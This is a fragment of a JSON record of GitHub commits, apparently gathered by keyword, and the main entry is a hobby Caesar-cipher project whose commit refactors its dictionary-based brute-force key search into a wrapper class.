@staticmethod\r\n    def is_partial_run(parser):\r\n        \"\"\" Create a Partial run based on an argument \"\"\"\r\n        logger.info('Executing Code on Partial Run')\r\n        return parser.parse_args().run\r\n\r\n    @staticmethod\r\n    def end_partial_run(fetch, header=None): #pylint: disable=unused-argument\r\n        \"\"\" End Partial Run based on an argument \"\"\"\r\n        logger.info('Ending Partial Run')\r\n        fetch_arr = fetch\r\n        fetch_arr.append(['#----------------------End of Partial Run---------------------#'])\r\n        return fetch_arr\r\n"}},"msg":"changed brute force"}},"https:\/\/github.com\/ilya-smut\/caesorcipher":{"413cb4beae0d904d2826c66098323d8f43cbf816":{"url":"https:\/\/api.github.com\/repos\/ilya-smut\/caesorcipher\/commits\/413cb4beae0d904d2826c66098323d8f43cbf816","html_url":"https:\/\/github.com\/ilya-smut\/caesorcipher\/commit\/413cb4beae0d904d2826c66098323d8f43cbf816","message":"Introduced Caesor class\n\nChanged some behaviour of basic function Brute_Force()","sha":"413cb4beae0d904d2826c66098323d8f43cbf816","keyword":"brute force change","diff":"diff --git a\/CaesorBasicFs.py b\/CaesorBasicFs.py\nindex cdb78bf..fc39ff2 100644\n--- a\/CaesorBasicFs.py\n+++ b\/CaesorBasicFs.py\n@@ -13,8 +13,6 @@ def get_set(path = 'dict.txt'):\n         \n     return wordset\n \n-wordset = get_set()\n-\n def encrypter(word, argument):\n \n     if (argument < 0) or (argument > 26):\n@@ -58,7 +56,7 @@ def decrypter(word, argument):\n     return dec_word\n \n \n-def brute_force(en_word):\n+def brute_force(en_word, wordset):\n     en_word = en_word.upper()\n     possible_keys = set()\n \ndiff --git a\/CaesorMngr.py b\/CaesorMngr.py\nnew file mode 100644\nindex 0000000..44a845c\n--- \/dev\/null\n+++ b\/CaesorMngr.py\n@@ -0,0 +1,27 @@\n+import CaesorBasicFs, CaesorPhraseHack\n+class Caesor:\n+    def __init__(self, path_to_wordset = 'dict.txt'):\n+        self.phrase =''\n+        self.wordset = CaesorBasicFs.get_set(path_to_wordset)\n+    \n+    def change_input(self, phrase):\n+        if type(phrase) == tuple:\n+            self.phrase, _ = phrase\n+        else:\n+            self.phrase = phrase\n+    \n+    def change_wordset(self, path_to_file):\n+        self.wordset = CaesorBasicFs.get_set(path_to_file)\n+    \n+    def encrypt(self, key):\n+        return CaesorBasicFs.encrypter(self.phrase, key)\n+\n+    def decrypt(self, key):\n+        return CaesorBasicFs.decrypter(self.phrase, key)\n+\n+    def brute_force(self):\n+        return CaesorPhraseHack.phrase_brute_force(self.phrase, self.wordset)\n+    \n+    def print(self):\n+        print(self.phrase)\n+\ndiff --git a\/CaesorPhraseHack.py b\/CaesorPhraseHack.py\nindex 1c968d6..266bf37 100644\n--- a\/CaesorPhraseHack.py\n+++ b\/CaesorPhraseHack.py\n@@ -1,12 +1,12 @@\n import CaesorBasicFs as caesor\n import PhraseHandling as handler\n \n-def phrase_brute_force(phrase):\n+def phrase_brute_force(phrase, wordset):\n     orgnl_phrs_list, orgnl_phrs_set = handler.into_words(phrase)\n     key_nums = {}\n     decrypted_phrase = ''\n     for en_word in orgnl_phrs_set:\n-        key_set = caesor.brute_force(en_word)\n+        key_set = caesor.brute_force(en_word, wordset)\n         for key in key_set:\n             if key not in key_nums.keys():\n                 key_nums[key] = 1\ndiff --git a\/main.py b\/main.py\nindex 498d526..216ea0c 100644\n--- a\/main.py\n+++ b\/main.py\n@@ -1,8 +1,7 @@\n-import CaesorPhraseHack as ph\n-import CaesorBasicFs as bf\n+from CaesorMngr import Caesor \n \n-message = 'I Love Olga very much'\n-encrypted_message = bf.encrypter(message, 18)\n-print(message)\n-print(encrypted_message)\n-print(ph.phrase_brute_force(phrase = encrypted_message))\n+c = Caesor()\n+c.change_input('I Enjoy being that stupid since I am so in love with my Dear Olga')\n+c.change_input(c.encrypt(23))\n+c.change_input(c.brute_force())\n+c.print()\n\\ No newline at end of file\n","files":{"\/CaesorBasicFs.py":{"changes":[{"diff":"\n         \n     return wordset\n \n-wordset = get_set()\n-\n def encrypter(word, argument):\n \n     if (argument < 0) or (argument > 26):\n","add":0,"remove":2,"filename":"\/CaesorBasicFs.py","badparts":["wordset = get_set()"],"goodparts":[]},{"diff":"\n     return dec_word\n \n \n-def brute_force(en_word):\n+def brute_force(en_word, wordset):\n     en_word = en_word.upper()\n     possible_keys = set()\n ","add":1,"remove":1,"filename":"\/CaesorBasicFs.py","badparts":["def brute_force(en_word):"],"goodparts":["def brute_force(en_word, wordset):"]}],"source":"\ncharacters=['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] def get_set(path='dict.txt'): with open(path) as dt: lines=dt.readlines() wordset=set() for word in lines: word=word.upper().strip() wordset.add(word) return wordset wordset=get_set() def encrypter(word, argument): if(argument < 0) or(argument > 26): print('ERROR: Choose key{0..26}') return None word=word.upper() en_word='' for char in word: if char==' ': new_char=char else: if((characters.index(char) +argument) < 26): new_char=characters[characters.index(char)+argument] else: new_char=characters[characters.index(char)+argument-26] en_word +=new_char return en_word def decrypter(word, argument): if(argument < 0) or(argument > 26): print('ERROR: Choose key{0..26}') return None en_word=word.upper() dec_word='' for char in en_word: if((characters.index(char) -argument) >=0): new_char=characters[characters.index(char)-argument] else: new_char=characters[characters.index(char)-argument+26] dec_word +=new_char return dec_word def brute_force(en_word): en_word=en_word.upper() possible_keys=set() for key in range(26): plainword=decrypter(en_word, key) if plainword in wordset: possible_keys.add(key) return possible_keys ","sourceWithComments":"characters = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']\n\n\ndef get_set(path = 'dict.txt'):\n    with open (path) as dt:\n        lines = dt.readlines()\n        \n    wordset = set()\n    \n    for word in lines:\n        word = word.upper().strip()\n        wordset.add(word)\n        \n    return wordset\n\nwordset = get_set()\n\ndef encrypter(word, argument):\n\n    if (argument < 0) or (argument > 26):\n        print('ERROR: Choose key {0..26}')\n        return None\n    \n    word = word.upper()\n    en_word = ''\n    for char in word:\n        if char == ' ':\n            new_char = char\n        else:\n        \n            if ((characters.index(char) + argument) < 26):\n                new_char = characters[characters.index(char)+argument]\n            else:\n                new_char = characters[characters.index(char)+argument-26]\n            \n        en_word += new_char\n        \n    return en_word\n\n\ndef decrypter(word, argument):\n\n    if (argument < 0) or (argument > 26):\n        print('ERROR: Choose key {0..26}')\n        return None\n    \n    en_word = word.upper()\n    dec_word = ''\n    \n    for char in en_word:\n        if ((characters.index(char) - argument) >= 0):\n            new_char = characters[characters.index(char)-argument]\n        else:\n            new_char = characters[characters.index(char)-argument+26]\n            \n        dec_word += new_char\n\n    return dec_word\n\n\ndef brute_force(en_word):\n    en_word = en_word.upper()\n    possible_keys = set()\n\n    for key in range(26):\n        plainword = decrypter(en_word, key)\n        if plainword in wordset:\n            possible_keys.add(key)\n\n    return possible_keys\n      \n\n"},"\/main.py":{"changes":[{"diff":"\n-import CaesorPhraseHack as ph\n-import CaesorBasicFs as bf\n+from CaesorMngr import Caesor \n \n-message = 'I Love Olga very much'\n-encrypted_message = bf.encrypter(message, 18)\n-print(message)\n-print(encrypted_message)\n-print(ph.phrase_brute_force(phrase = encrypted_message))\n+c = Caesor()\n+c.change_input('I Enjoy being that stupid since I am so in love with my Dear Olga')\n+c.change_input(c.encrypt(23))\n+c.change_input(c.brute_force())\n+c.print()\n\\ No newline at end of file\n","add":6,"remove":7,"filename":"\/main.py","badparts":["import CaesorPhraseHack as ph","import CaesorBasicFs as bf","message = 'I Love Olga very much'","encrypted_message = bf.encrypter(message, 18)","print(message)","print(encrypted_message)","print(ph.phrase_brute_force(phrase = encrypted_message))"],"goodparts":["from CaesorMngr import Caesor ","c = Caesor()","c.change_input('I Enjoy being that stupid since I am so in love with my Dear Olga')","c.change_input(c.encrypt(23))","c.change_input(c.brute_force())","c.print()"]}],"source":"\nimport CaesorPhraseHack as ph import CaesorBasicFs as bf message='I Love Olga very much' encrypted_message=bf.encrypter(message, 18) print(message) print(encrypted_message) print(ph.phrase_brute_force(phrase=encrypted_message)) ","sourceWithComments":"import CaesorPhraseHack as ph\nimport CaesorBasicFs as bf\n\nmessage = 'I Love Olga very much'\nencrypted_message = bf.encrypter(message, 18)\nprint(message)\nprint(encrypted_message)\nprint(ph.phrase_brute_force(phrase = encrypted_message))\n"}},"msg":"Introduced Caesor class\n\nChanged some behaviour of basic function Brute_Force()"}}}